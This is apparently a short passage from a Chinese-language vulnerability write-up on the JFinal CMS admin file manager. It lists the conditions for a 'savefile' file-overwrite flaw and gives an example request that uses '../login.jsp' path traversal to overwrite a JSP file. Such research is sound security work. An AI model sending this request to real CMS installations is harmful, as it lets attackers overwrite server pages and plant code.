  17.                         conn = config.getConnection();

  20.                         } else {

需要满足几个条件，分别是：

  1.   request.getMethod().equals("POST")
  2.   mode.equals("savefile")
  3.         需要有一个知道文件名的文件，并且为jsp后缀

也就是说我们传参：

  1. http://www.test.com:8080/jfinal_cms_war/admin/filemanager/index?path=../login.jsp&mode=savefile

  3. data：
  4. content:"11111"
